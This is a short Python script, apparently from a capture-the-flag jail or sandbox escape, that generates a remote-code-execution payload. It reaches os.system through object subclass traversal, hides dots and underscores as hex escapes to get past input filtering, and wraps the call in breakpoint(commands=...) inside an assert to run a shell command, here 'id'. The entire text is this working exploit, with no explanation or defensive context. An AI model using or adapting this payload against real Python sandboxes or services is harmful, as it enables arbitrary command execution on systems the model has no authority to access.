cmd = 'id'
rce_exploit = f"[].__class__.__base__.__subclasses__()[123].load_module('os').system('{cmd}')".replace('.', '\\x2E').replace('_', '\\x5F')
payload = f"assert breakpoint(commands=[\"{rce_exploit}\"])"
print(payload)
